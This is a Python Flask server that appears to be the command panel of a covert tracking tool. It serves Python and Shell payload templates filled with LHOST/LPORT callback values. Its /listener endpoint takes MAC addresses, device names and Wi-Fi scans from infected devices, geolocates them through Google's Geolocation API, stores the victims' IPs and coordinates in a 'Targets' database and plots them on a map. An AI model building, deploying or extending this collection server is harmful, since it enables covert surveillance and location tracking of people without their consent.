#!/usr/bin/env python3
from flask import (
    Flask,
    render_template,
    url_for,
    redirect,
    render_template_string,
    request,
    make_response,
)
import json
import sqlite3
import os
import requests
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Retrieve the API_KEY from environment variables
API_KEY = os.getenv("API_KEY")

# Read the contents of Python and Shell scripts
PYTHON_SCRIPT = open("scripts/python_script.py").read()
SHELL_SCRIPT = open("scripts/shell_script.sh").read()


app = Flask(
    __name__,
    static_url_path="",
    static_folder="web/static",
    template_folder="web/templates",
)


@app.route("/")
def index():
    return render_template("landing.html")

@app.route("/targets")
def targets():
    try:
        db_file = "targets.db"

        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()

        # Execute a SELECT query to fetch data from the "Targets" table
        cursor.execute("SELECT * FROM Targets")
        targets = cursor.fetchall()

        conn.close()

        return render_template("targets.html", targets=targets)
    except:
        return make_response("Error loading database", 404)

@app.route("/payloads")
def payloads():
    return render_template("payloads.html")

@app.route("/payloads/templates", methods=["POST"])
def python_payload():
    # Get JSON data from the request
    payload = request.get_json()

    # Determine the template based on the payload's language
    if payload["language"] == "Python":
        template = PYTHON_SCRIPT
    elif payload["language"] == "Shell":
        template = SHELL_SCRIPT

    return render_template_string(
        template, LHOST=payload["lhost"], LPORT=payload["lport"]
    )

@app.route("/map")
def map():
    try:
        conn = sqlite3.connect("targets.db")

        cursor = conn.cursor()
        cursor.execute("SELECT DEVICE, LAT, lng FROM TARGETS")

        data_tuples = cursor.fetchall()

        cursor.close()
        conn.close()

        return render_template("map.html", locations=data_tuples)
    except:
        return make_response("Error loading database", 404)

@app.route("/listener", methods=["POST"])
def listener():
    try:
        # Get JSON data from the request
        payload = request.get_json()
        client_ip = request.remote_addr
        mac = payload["mac"]
        device = payload["device"]

        # Send a request to the Google Geolocation API
        response = requests.post(
            f"https://www.googleapis.com/geolocation/v1/geolocate?key={API_KEY}",
            headers={
                "Content-Type": "application/json",
            },
            data=json.dumps(payload["wifi_data"]),
        )
        
        print(response.json())

        # Extract location information from the API response
        location = response.json()["location"]
        lat = location["lat"]
        lng = location["lng"]

        # Insert data into the database
        insert_data(client_ip, mac, lat, lng, device)

        return make_response("OK", 201)
    except Exception as e:
        print(f"Error: {e}")
        return make_response("Problem saving data", 400)

# Function to insert data into the SQLite database
def insert_data(ip, mac, lat, lng, device):
    try:
        conn = sqlite3.connect("targets.db")
        cursor = conn.cursor()

        cursor.execute(
            "INSERT INTO Targets (IP, MAC, LAT, lng, DEVICE) VALUES (?, ?, ?, ?, ?)",
            (ip, mac, lat, lng, device),
        )

        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"Error inserting data: {str(e)}")
        return False

if __name__ == "__main__":
    # Check if an API key is valid or not
    if not API_KEY or API_KEY == "GOOGLE_GEOLOCATION_API_KEY":
        print("Invalid or no API key found")
        quit()
    
    # Start the Flask app on default 0.0.0.0:5000
    app.run(host="0.0.0.0", port=5000)
